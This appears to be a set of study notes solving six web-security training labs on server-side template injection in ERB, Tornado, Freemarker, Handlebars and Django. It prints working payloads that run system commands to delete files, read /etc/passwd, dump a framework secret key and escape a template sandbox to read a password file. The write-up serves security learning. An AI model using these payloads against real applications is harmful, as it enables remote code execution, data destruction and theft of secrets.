### 1. Lab: Basic server-side template injection
> This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.
To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

When we click first product the URL will be as follows
`/?message=Unfortunately%20this%20product%20is%20out%20of%20stock`
Moreover, the message is reflected in the response, as it is ERB template, we will simply execute system function to remove morale file.
`<%= system("rm /home/carlos/morale.txt") %>`

### 2. Lab: Basic server-side template injection (code context)
> This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials: `wiener:peter`

After we login, and change the prefer name and do the comment we will see that it will get executed in name of comment.
`user.first_name}}{{7*7}}`
![[Pasted image 20250901182650.png]]
Now, we will use OS command injection in order to delete morale file.
`}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`
On reloading comment page will solve the lab.

### 3. Lab: Server-side template injection using documentation 
> This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials: `content-manager:C0nt3ntM4n4g3r`

When we try to change the template we will use `${test}`. As there is no variable named as test, it will give error.
![[Pasted image 20250901183527.png]]
![[Pasted image 20250901183541.png]]
From this error, we got to know about the template which is `freemaker`. Now googling that template will give us the injection payload.
`${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}`
![[Pasted image 20250901183457.png]]
Now simply deleting a file will solve the lab.
`${"freemarker.template.utility.Execute"?new()("rm -rf /home/carlos/morale.txt")}`
### 4. Lab: Server-side template injection in an unknown language with a documented exploit
> This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

Simply using the fuzzing string will give us the error which shows the website is using handlebars template.
![[Pasted image 20250901184135.png]]
On googling we found an exploit.
https://gist.github.com/vandaimer/b92cdda62cf731c0ca0b05a5acf719b2
Now we will change the exploit to delete morale.txt
```handlebars
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}

            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}

                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```
URL encoding it and submitting in message will solve the lab.

### 5. Lab: Server-side template injection with information disclosure via user-supplied objects
> This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.
To solve the lab, steal and submit the framework's secret key.
You can log in to your own account using the following credentials:
`content-manager:C0nt3ntM4n4g3r`

![[Pasted image 20250901210816.png]]
So from this, we can check the documentation of Django and we will notice that the built-in template tag `debug` can be called to display debugging information. `{% debug %}`. In the object we will notice that you can access the `settings` object. Using `{{settings.SECRET_KEY}}` we can able to get secret key.
![[Pasted image 20250901211141.png]]
### 6. Lab: Server-side template injection in a sandboxed environment
> This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file `my_password.txt` from Carlos's home directory. Then submit the contents of the file.
You can log in to your own account using the following credentials:
`content-manager:C0nt3ntM4n4g3r`

First we will check the template using error shown by `${test}`. Then we will find the payload in this case it will be 
```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
![[Pasted image 20250901211652.png]]
Using cyberchef to convert decimal to string
https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)&input=OTcgMTA2IDExNiAxMTggMTAyIDExNCAxMDcgOTkgMTAxIDExMSA1NiAxMDcgNTIgMTA0IDU3IDUwIDU0IDEwNCA1MSAxMDENCg&ieol=CRLF&oeol=CRLF
Submitting the solution will solve the lab.

